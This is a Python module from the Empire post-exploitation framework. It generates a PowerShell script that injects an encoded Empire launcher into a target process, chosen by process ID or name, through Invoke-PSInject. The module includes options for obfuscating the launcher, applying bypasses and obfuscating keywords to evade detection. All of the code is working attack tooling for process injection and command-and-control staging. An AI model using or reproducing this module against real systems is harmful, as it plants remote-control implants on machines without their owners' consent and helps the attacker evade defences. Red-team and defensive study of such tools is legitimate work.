from __future__ import print_function

import pathlib
from builtins import object
from builtins import str
from typing import Dict

from empire.server.common import helpers
from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(main_menu, module: PydanticModule, params: Dict, obfuscate: bool = False, obfuscation_command: str = ""):
        # Set booleans to false by default
        obfuscate_launcher = False

        listener_name = params['Listener']
        proc_id = params['ProcId'].strip()
        proc_name = params['ProcName'].strip()
        if (params['Obfuscate']).lower() == 'true':
            obfuscate_launcher = True
        obfuscate_command_launcher = params['ObfuscateCommand']

        if proc_id == '' and proc_name == '':
            return handle_error_message("[!] Either ProcID or ProcName must be specified.")

        # staging options
        user_agent = params['UserAgent']
        proxy = params['Proxy']
        proxy_creds = params['ProxyCreds']

        # read in the common module source code
        module_source = main_menu.installPath + "/data/module_source/management/Invoke-PSInject.ps1"
        if main_menu.obfuscate:
            obfuscated_module_source = module_source.replace("module_source", "obfuscated_module_source")
            if pathlib.Path(obfuscated_module_source).is_file():
                module_source = obfuscated_module_source

        try:
            with open(module_source, 'r') as f:
                module_code = f.read()
        except:
            return handle_error_message("[!] Could not read module source path at: " + str(module_source))

        if main_menu.obfuscate and not pathlib.Path(obfuscated_module_source).is_file():
            script = data_util.obfuscate(installPath=main_menu.installPath, psScript=module_code, obfuscationCommand=main_menu.obfuscateCommand)
        else:
            script = module_code

        script_end = ""
        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: %s" %(listener_name))
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(listener_name, language='powershell', obfuscate=obfuscate_launcher,
                                                           obfuscationCommand=obfuscate_command_launcher, encode=True,
                                                           userAgent=user_agent, proxy=proxy, proxyCreds=proxy_creds,
                                                           bypasses=params['Bypasses'])
            if launcher == '':
                return handle_error_message('[!] Error in launcher generation.')
            elif len(launcher) > 5952:
                return handle_error_message("[!] Launcher string is too long!")
            else:
                launcher_code = launcher.split(' ')[-1]

                if proc_id != '':
                    script_end += "Invoke-PSInject -ProcID %s -PoshCode %s" % (proc_id, launcher_code)
                else:
                    script_end += "Invoke-PSInject -ProcName %s -PoshCode %s" % (proc_name, launcher_code)

        if main_menu.obfuscate:
            script_end = data_util.obfuscate(main_menu.installPath, psScript=script_end, obfuscationCommand=main_menu.obfuscateCommand)
        script += script_end
        script = data_util.keyword_obfuscation(script)

        return script
